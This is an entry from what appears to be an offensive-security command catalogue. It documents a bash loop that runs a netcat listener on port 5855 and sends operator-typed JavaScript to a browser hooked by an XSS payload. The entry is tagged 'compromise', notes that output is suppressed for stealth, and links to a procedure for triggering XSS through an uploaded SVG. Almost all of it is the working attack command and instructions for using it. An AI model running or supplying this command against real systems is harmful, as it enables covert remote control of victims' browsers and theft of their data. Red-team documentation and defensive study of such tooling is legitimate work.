---
data: 'while :; do printf "j$ "; read c; echo $c | nc -lp 5855 >/dev/null; done'
tags:
  - listener
  - nc
  - compromise
type: command
executor: bash
platforms:
  - Linux
  - macOS
id: 4684287a-5a33-482c-9881-df235643468e
created_at: '2025-12-14T03:16:14.040Z'
updated_at: '2025-12-14T03:16:14.040Z'
verified: false
validated: true
submitted: true
---
# bash-loop-nc-listener

## Command

```bash
while :; do printf "j$ "; read c; echo $c | nc -lp 5855 >/dev/null; done
```

## Description

Bash loop that sets up a netcat listener on port 5855, prompting for input, prefixing with 'j', and forwarding to receive JavaScript commands from the XSS payload for remote execution.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| port | Listening port | Yes |

## Examples

### Basic Usage

```bash
while :; do printf "j$ "; read c; echo $c | nc -lp 5855 >/dev/null; done
```

## Expected Output

Prompts repeatedly ('j$ '), sends input to port 5855, suppresses output for stealth.

## Related

- [[Related Procedure: Trigger-XSS-by-Viewing-Uploaded-SVG]]
